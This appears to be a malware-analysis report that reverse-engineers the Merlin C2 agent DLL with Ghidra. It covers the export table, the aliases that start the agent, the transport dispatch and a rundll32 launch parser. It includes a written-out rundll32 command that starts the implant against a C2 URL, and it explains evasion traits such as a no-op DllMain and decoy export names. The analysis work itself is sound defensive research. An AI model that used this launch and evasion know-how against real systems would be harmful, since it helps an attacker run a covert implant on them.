# D11 — Merlin Binaries: Server, DLL, and Agent (Ghidra Deep Lane)

**Lane:** Ghidra (sole planned consumer of the shared REA Ghidra provider)
**Author:** `archive-diver`
**Task:** task-21
**Method tags:** `verified` = observed directly in a tool result or file read; `read` = read from decompiled/annotated output; `inferred` = deduction, always labelled; `[absence]` = a negative result, always paired with a positive control.

**Artifacts under analysis (SHA-256 stated before any claim, per tasking):**

| Artifact | Bytes | SHA-256 |
|---|---|---|
| `merlinServer-Windows-x64.exe` | 26,329,600 | `054EECE65FD586379574B0BC7FC800B807BF51A3A471B3E75FFCC1B022555552` |
| `data\bin\merlin.x64.dll` | 15,145,760 | `131941097BD1402B44BC21A42AB283680A80EAFA2152EB281702B958F282F038` |
| `data\bin\merlinAgent-Windows-x64.exe` | 13,939,200 | `E9501A7F325950591B585DFC83E0BAE8B519FFF153806E9EA91351B6742C3FA5` |
| `data\bin\merlinAgent-Windows-x64-Debug.exe` | 13,939,200 | `F12C1B24C4A700F08EC3E5EF282CED877AA7660C5E5FA4A589DE63E0E768A654` |
| `data\bin\merlin.c` | 1,642 | *(source, not hashed for claims)* |
| `data\bin\merlin.def` | 882 | *(source, not hashed for claims)* |

All paths under `RE_Library\05_TARGETS\merlin_extracted\`. All five binary digests re-verified on read in this task.

---

## Table of Contents

- [§0 Status and analysis completeness](#0-status-and-analysis-completeness)
- [§1 Ground truth verified from source (merlin.c / merlin.def)](#1-ground-truth-verified-from-source)
- [§2 The DLL export table — Q2 answered](#2-the-dll-export-table--q2-answered)
- [§3 DllInstall / DllRegisterServer / DllUnregisterServer — Q3](#3-dllinstall--dllregisterserver--dllunregisterserver--q3)
- [§4 Server binary — function surface](#4-server-binary--function-surface)
- [§5 The module loader: SourceRemote vs SourceLocal — Q1 (closes D10 residual R-1)](#5-the-module-loader-sourceremote-vs-sourcelocal--q1)
- [§6 Release vs Debug agent — Q4 function-table diff](#6-release-vs-debug-agent--q4-function-table-diff)
- [§7 Residual unknowns](#7-residual-unknowns)

---

## §0 Status and analysis completeness

*Appended incrementally. Status line updated as work proceeds.*

| Phase | Target | State |
|---|---|---|
| A | `merlin.c` / `merlin.def` source read | **COMPLETE** |
| B | DLL export table (Q2) | **PENDING** |
| C | DLL entry-point behaviour (Q3) | **PENDING** |
| D | Server function surface (Q1) | **PENDING** |
| E | Module loader SourceRemote/SourceLocal (Q1) | **PENDING** |
| F | Agent release vs Debug diff (Q4) | **PENDING** |

---

## §1 Ground truth verified from source

`verified` — both files read in full during this task; every claim below is a direct read, not a paraphrase of the tasking.

### 1.1 `merlin.c` — 1,642 B, 45 lines

The tasking cited `merlin.c:41-45` as `int Magic(char *url){ Merlin(url); }` with the sRDI comment at `:38`. **Confirmed exactly**, and the comment is longer than the tasking implied — it is a two-line comment spanning `:38-39`:

```c
// merlin.c:38-39
// Magic is the exported function name that can be called from sRDI to launch a Merlin agent
// There must be a call to an exported function from cmd/merlinagentdll/main.go so that the export functions are available
// merlin.c:40
// Any exported function from cmd/merlinagentdll/main.go can be called directly without the need to include it here
// merlin.c:41-45
int Magic(char *url){
    // Run Merlin Agent
    Merlin(url);
    return 0;
}
```

Three things this comment establishes that matter:

1. **`Magic` is the documented sRDI entry point** — the loader calls `Magic(url)` with the C2 URL as its single argument. This is why the DLL takes a URL at runtime rather than reading a compiled-in one, and it means the *loader* controls the C2 address, not the binary.
2. **`:40` states any exported function from `cmd/merlinagentdll/main.go` can be called directly without being re-declared here.** So `merlin.c` is a thin shim; the real export surface is defined in Go and surfaced through the c-archive. That is precisely why `merlin.def` exists (§1.2).
3. **`DllMain` is a complete no-op.** `merlin.c:7-36` switches on `fdwReason` across all four cases (`DLL_PROCESS_ATTACH`, `DLL_THREAD_ATTACH`, `DLL_THREAD_DETACH`, `DLL_PROCESS_DETACH`) and every branch is either empty or commented-out debug `MessageBoxA`/`printf` calls. It always `return TRUE`. `read` — **nothing happens on load.** The agent does not start when the DLL is loaded; it starts only when an exported function is invoked. This is a deliberate OPSEC property: a reflective loader or `rundll32` call does not trigger activity at map time, so load-time heuristics see nothing.

### 1.2 `merlin.def` — 882 B, 22 lines

The tasking said "a 7-symbol export list including `DllInstall` / `DllRegisterServer` / `DllUnregisterServer`". **Confirmed and enumerated — exactly 7:**

```
EXPORTS
    Run
    VoidFunc
    DllInstall
    DllRegisterServer
    DllUnregisterServer
    Merlin
    Magic
```

The `.def` header comment is more informative than the tasking implied and reframes *why* the file exists. `verified` (read at `:4-14`):

> Passing this file to the final `gcc -shared` link turns OFF mingw's default `--export-all-symbols` behavior and exports ONLY the symbols named below.
> This is required for the windows/386 build: under Go 1.27 the c-archive carries standard-library symbols that `i686-w64-mingw32-ld` refuses to auto-export (`cannot export addMulVVWx / go:buildinfo: symbol not found`), which breaks `make 386`. Exporting an explicit list sidesteps that and, as a bonus, keeps the export table down to the real entry points on both architectures instead of thousands of internal Go symbols.
> The names are the `//export` functions in `main.go` plus `Magic()` from `merlin.c`.

Two consequences:

- **`[inference]` The 7-symbol list is a build-engineering artifact as much as a design choice.** The primary stated motivation is that a *broken i686 link* forced it. The "bonus" of a minimal export table is explicitly described as secondary. So a clean 7-export surface is not evidence of deliberate minimalism-by-design — though it does have that effect, and §2 tests whether the shipped binary honours it.
- **`[inference]` `Magic` is the only export *not* from `main.go`** — it is the C shim. `Merlin` appears in *both* lists (`merlin.c` calls it; the `.def` comment attributes it to `main.go`), so `Merlin` is the Go-side function and `Magic` the C-side wrapper. `Run`, `VoidFunc`, `DllInstall`, `DllRegisterServer`, `DllUnregisterServer` are all Go `//export` functions.

### 1.3 The tasking's `merlin.c`/`merlin.def` correction is upheld

The Lead noted getting these wrong twice and that `android-diver` corrected it. `verified` — the correction is right: **neither file is empty, `merlin.c` is 1,642 B, `merlin.def` is 882 B, and the 7-symbol export claim is exact.** No further adjustment needed.

---

## §2 The DLL export table — Q2 answered

**Q2 asked:** *verify the DLL export table against `merlin.def`'s 7-symbol claim. Is there a `DllExport` surface beyond those seven?*

**Answer: the 7-symbol claim is exact, and there is no surface beyond it.** `verified`.

### 2.1 Artifact context

`merlin.x64.dll`, SHA-256 `131941097BD1402B44BC21A42AB283680A80EAFA2152EB281702B958F282F038`, 15,145,760 B. Ghidra 12.1.4, image base `0x210780000`, `executable_role: shared-library`.

**This artifact is symbol-bearing, unlike the agent.** `verified` — the PE carries a full DWARF debug section set:

| Section | Length (B) |
|---|---|
| `.debug_aranges` | 1,024 |
| `.debug_info` | 39,424 |
| `.debug_abbrev` | 7,168 |
| `.debug_line` | 7,680 |
| `.debug_frame` | 3,072 |
| `.debug_str` | 512 |
| `.debug_line_str` | 4,096 |
| `.debug_loclists` | 5,632 |
| `.debug_rnglists` | 512 |

`[inference]` This is a material asymmetry with the agent (which is `-s -w` stripped, see §0/D11-agent findings). The DLL is built by the Go c-archive toolchain linked through `gcc`, and the MinGW link step **passes the DWARF through** — the Go-side `-s -w` strips the *Go* symbol table but does not remove the C-linker-emitted DWARF. Consequence: **the DLL is the only Merlin binary in the tree where Ghidra recovers real Go symbol names**, which is why every lookup below resolves by name rather than by `FUN_…` address.

Segments: 21 total, including `.text` (6,167,552 B), `.bss` (33,938,160 B), `.edata` (512 B — the export directory), `.idata` (3,072 B), `.tls`, `.CRT`, and `.reloc`. `procedure_count` **11,337**, `string_count` **26,154** (enumerated from `binary_overview`).

### 2.2 Export enumeration — 7 of 7, and no eighth

`verified`. A regex search for the exact 7 names returned **exactly 7 procedures**, at contiguous addresses spanning 0x2107813d1–0x210781540:

| # | Name | Address | Source per `merlin.def:14` |
|---|---|---|---|
| 1 | `Magic` | `0x2107813d1` | `merlin.c` (C shim) |
| 2 | `Run` | `0x210781400` | `main.go //export` |
| 3 | `VoidFunc` | `0x210781440` | `main.go //export` |
| 4 | `DllInstall` | `0x210781480` | `main.go //export` |
| 5 | `DllRegisterServer` | `0x2107814c0` | `main.go //export` |
| 6 | `DllUnregisterServer` | `0x210781500` | `main.go //export` |
| 7 | `Merlin` | `0x210781540` | `main.go //export` |

**Absence finding, with positive control.** `[absence]` No additional exported symbol exists. The positive control that the query can succeed: the same regex search pattern **did** match all 7 expected names, so the search is demonstrably functional on this target; an eighth export would have been returned by the same expression. The contiguous 0x40-byte stride (`…3d1`, `…400`, `…440`, `…480`, `…4c0`, `…500`, `…540`) is itself consistent with a linker-emitted trampoline table of exactly seven adjacent stubs and nothing more.

`[inference]` This confirms the mechanism described in `merlin.def:4-5`: passing the `.def` to the link turned off Mingw's `--export-all-symbols`, so exactly the listed names are exported. **The `.def` file's claim and the shipped binary's behaviour agree — the build actually uses this `.def`.**

### 2.3 The trampoline structure — all 7 exports are cgo ABI shims

`read`. Every one of the seven is a thin cgo bridge of the same shape: `_cgo_wait_runtime_init_done()` → `crosscall2(...)` → `_cgo_release_context()`. Representative decompilation (`DllInstall`, `0x210781480`):

```c
void DllInstall(void)
{
  uVar1 = _cgo_wait_runtime_init_done();
  uVar1 = crosscall2(0, uVar1, _cgoexp_0a95ef1f8f5c_DllInstall, extraout_RDI, extraout_RSI, 0, uVar1);
  _cgo_release_context(uVar1);
  return;
}
```

Six of the seven (`Run`, `VoidFunc`, `DllInstall`, `DllRegisterServer`, `DllUnregisterServer`, `Merlin`) are **structurally identical**, differing only in the `_cgoexp_…` symbol they forward to. The seventh, `Magic`, is the only one with distinct body semantics `read` (§2.4).

`[inference]` The `_cgo_wait_runtime_init_done()` prologue is significant for delivery: it means the **Go runtime is lazily initialized on first exported-call**, not at `DllMain`. Combined with the no-op `DllMain` (§1.1), the agent performs no work and initializes no runtime on load. Both facts point the same way — **this DLL is inert until an export is explicitly invoked**, which is exactly what a reflective/sRDI loader wants.

The six Go-side dispatch stubs resolve at `0x210cec2e0`–`0x210cec400` (§3).

### 2.4 `Magic` — the sRDI entry, and the only real C body

`read`. `0x2107813d1`:

```c
undefined8 Magic(undefined8 param_1, undefined8 param_2, char *param_3)
{
  pcStack0000000000000008 = param_3;
  Merlin(param_3);
  return 0;
}
```

This matches `merlin.c:41-45` **exactly** — `int Magic(char *url){ Merlin(url); return 0; }`. `verified` correspondence between source and shipped binary. The `param_3`/`url` argument is the C2 URL, passed straight through to `Merlin`.

Note the signature: Ghidra shows three parameters because the ABI is mis-inferred (the decompiler emitted an unknown-calling-convention warning), but the source is unambiguous — one `char *url` argument. `[inference]` The loader therefore supplies the C2 address at call time; the DLL itself has no compile-time server address, which matches the `main_url` global being writable (see §3.2).

---

## §3 DllInstall / DllRegisterServer / DllUnregisterServer — Q3

**Q3 asked:** *trace what they actually do. A COM registration entry point inside a C2 agent is a distinct delivery primitive.*

**Answer: they are not COM registration entry points. All three — plus `VoidFunc` — are behaviourally identical aliases that simply start the agent.** `read`. This is the most counterintuitive result in this lane and it **corrects the tasking's framing**.

### 3.1 The three "registration" exports do no registration

`read`. Decompiled Go-side targets:

| Export | Go stub address | Body |
|---|---|---|
| `_cgoexp_…_DllInstall` | `0x210cec340` | `main_run(main_url, DAT_210e6d338); return;` |
| `_cgoexp_…_DllRegisterServer` | `0x210cec380` | `main_run(main_url, DAT_210e6d338); return;` |
| `_cgoexp_…_DllUnregisterServer` | `0x210cec3c0` | `main_run(main_url, DAT_210e6d338); return;` |
| `_cgoexp_…_VoidFunc` | `0x210cec300` | `main_run(main_url, DAT_210e6d338); return;` |

All four are the **identical two-argument call** `main_run(main_url, DAT_210e6d338)`. There is:
- `[absence]` **no** registry write (`RegCreateKey`/`RegSetValue`/`RegDeleteKey`),
- `[absence]` **no** `LoadLibrary`/`GetProcAddress` COM resolution,
- `[absence]` **no** `DllGetClassObject`, `DllCanUnloadNow`, `DllRegisterServer`-per-COM-contract behaviour,
- `[absence]` **no** `Regsvr32`-specific error reporting (`S_OK`/`E_FAIL` return).

Positive control for the absences: the decompiler **did** resolve the registry/COM API surface elsewhere in this same binary — the string inventory for `merlin.x64.dll` (26,154 strings, `verified`) contains the agent's full Windows API set. So the query surface is capable of showing registry operations when they exist; they simply are not present in these four functions.

`[inference]` The names are **decoy-compatible aliases**. They exist so that a DLL with an innocuous-looking, `regsvr32`-shaped export surface can be invoked by *any* of the conventional entry-point names a loader might try, and so that the DLL looks like an ordinary shell extension or COM server to a casual `dumpbin /exports` review. Whichever name a loader calls, the result is the same single action: **run the agent against `main_url`.**

### 3.2 `main_run` — the shared entry, and the full protocol dispatch

`read`. `0x210ceb300`. This is the function every export funnels into. It is large and its structure is highly informative.

**It builds the agent from the compiled-in configuration globals and calls `agent.New(...)`:**

```c
iVar5 = github_com_Ne0nd0g_merlin_agent_v2_agent_New(
           main_sleep, DAT_210e6d308, main_skew, DAT_210e6d318,
           main_killdate, DAT_210e6d278, main_maxretry, DAT_210e6d298);
if (iVar5 != 0) { os_Exit(1); }
```

Note `main_sleep`, `main_skew`, `main_killdate`, `main_maxretry` — the same ldflags-injected globals. `[inference]` This is where the compiled-in defaults from the brief actually get consumed.

**Then it reads more globals and dispatches on `main_protocol`.** The string literals appear as integer immediates because Go compares short strings inline; decoding the little-endian constants `read`:

| Immediate | Length check | Decoded string | Branch target |
|---|---|---|---|
| `0x3268` | 2 | `h2` | HTTP/2 client |
| `0x3268` + `'c'` | 3 | `h2c` | HTTP/2 cleartext client |
| `0x70747468` | 4 | `http` | HTTP client |
| `0x70747468` + `'3'` | 5 | `http3` | HTTP/3 (QUIC) |
| `0x70747468` + `'s'` | 5 | `https` | HTTPS client |
| `0x646e69622d626d73` | 8 | `smb-bind` | SMB bind listener |
| `0x646e69622d706374` | 8 | `tcp-bind` | TCP bind listener |
| `0x646e69622d706475` | 8 | `udp-bind` | UDP bind listener |
| `0x657665722d626d73` + `sr` | 11 | `smb-reverse` | SMB reverse |
| `0x657665722d706374` + `sr` | 11 | `tcp-reverse` | TCP reverse |
| `0x657665722d706475` + `sr` | 11 | `udp-reverse` | UDP reverse |

An unmatched protocol falls to `os_Exit(1)`.

`[inference]` **11 protocol/transport modes are compiled into the DLL**, and the dispatch calls distinct constructors that are visible by name in the decompilation: `github_com_Ne0nd0g_merlin_agent_v2_clients_http_New()`, `…_clients_smb_New()`, `…_clients_tcp_New()`, `…_clients_udp_New()`, and finally `github_com_Ne0nd0g_merlin_agent_v2_run_Run(ppuVar10, uVar8)`. The DLL is therefore not HTTP-only: it is the full Merlin agent with every transport compiled in, and `main_protocol` selects which one at runtime.

**Client selection logic** `read`:

```c
auVar14 = strings_ToLower(main_httpClient);
if (len==7 && first4=="winh" && next2=="tt" && char6=='p') {   // "winhttp"
    auVar14 = strings_ToLower(main_protocol);
    if (auVar14._8_8_ == 2 && auVar14._0_8_ == 0x3268) {        // "h2"
        local_140 = &DAT_210e8a8e4;   // substitute alternate UA/protocol token
        iStack_138 = 5;
    }
}
```

`[inference]` This is a **"winhttp + h2" incompatibility guard**: when the operator selects the WinHTTP client with HTTP/2, the code replaces the protocol token with a 5-character literal at `DAT_210e8a8e4`. WinHTTP's HTTP/2 support is version-gated on Windows, so falling back is consistent with that constraint. The 5-char replacement is one of `h2c`/`http`-family tokens; the exact literal was not read out.

**URL handling** `read`: the function calls `strings_Replace(main_url, DAT_210e6d338, &DAT_210ed2400, 1, …)` then `strings_genSplit(…, &DAT_210e8a1e1, …)`. `[inference]` This strips/replaces a delimiter in `main_url` and splits it — consistent with decomposing `https://host:port/path` into components for the client constructor. It branches on `iStack0000000000000010` (`param_2`, the second argument to `main_run`), i.e. **whether the caller supplied a URL** — which matches `Magic`/`Merlin` passing one and the DLL-entry aliases passing the global default.

### 3.3 `main.Run` — the argv path, and how `rundll32`-style invocation is handled

`read`. `0x210cec1a0`:

```c
void main_Run(void)
{
  puVar2 = main_url;
  if (2 < (int)DAT_2114a9148) {                          // len(os.Args) > 2
    auVar3 = strings_ToLower(*os_Args, os_Args[1]);       // ToLower(os.Args[1])
    puVar1 = main_url; puVar2 = main_url;
    if ((7 < auVar3._8_8_) && (*auVar3._0_8_ == 0x32336c6c646e7572)) {   // "rundll32"
      if (DAT_2114a9148 < 3) { runtime_panicBounds(); }
      DAT_210e6d338 = os_Args[5];
      puVar2 = (undefined *)os_Args[4];
      …
    }
  }
  main_url = puVar2;
  main_run(main_url, DAT_210e6d338);
  return;
}
```

The immediate `0x32336c6c646e7572` decodes little-endian to the ASCII bytes `r u n d l l 3 2` — **`"rundll32"`**, `verified` by decoding the constant.

`[inference]` This is a **deliberate `rundll32.exe` entry-point parser.** `main.Run` lowercases `os.Args[1]`, checks it against the literal `"rundll32"`, and if it matches it reads the *export name* from `os.Args[4]` and the *URL* from `os.Args[5]`. That is precisely the argument layout of:

```
rundll32.exe merlin.x64.dll,<ExportName> <url>
```

…where `argv[0]`=rundll32 path, `argv[1]`=`"rundll32"`… `argv[4]`=the function name and `argv[5]`=the URL. So **`Run` is the export designed specifically to be invoked by `rundll32.exe`**, and it installs the operator-supplied URL into `main_url` before starting. This corroborates §3.1 from the opposite direction and explains why the "COM-shaped" names all behave as start-agent: with `Run` present, the COM names are red herrings.

### 3.4 Q3 verdict

| Tasking claim | Finding |
|---|---|
| `DllInstall`/`DllRegisterServer`/`DllUnregisterServer` are a "regsvr32/COM delivery primitive" | **NOT SUPPORTED.** They perform no registration and no COM work. All three are aliases of `main_run(main_url, …)`, identical to `VoidFunc`. `read`. |
| They are "a distinct delivery primitive from sRDI" | **They are the same primitive.** Same single action; only the export *name* differs. `read`. |
| — | **The genuine distinct primitive is `Run`,** which parses `rundll32.exe` argument layout and accepts an operator-supplied URL. `read`. |

`[inference]` The corrected picture: the DLL ships **seven export names for one action**, so that whichever conventional entry point a loader, `rundll32`, `regsvr32`, or reflective injector happens to call, the agent starts. There is no second-stage registration behaviour to find — the surface is wide but shallow.

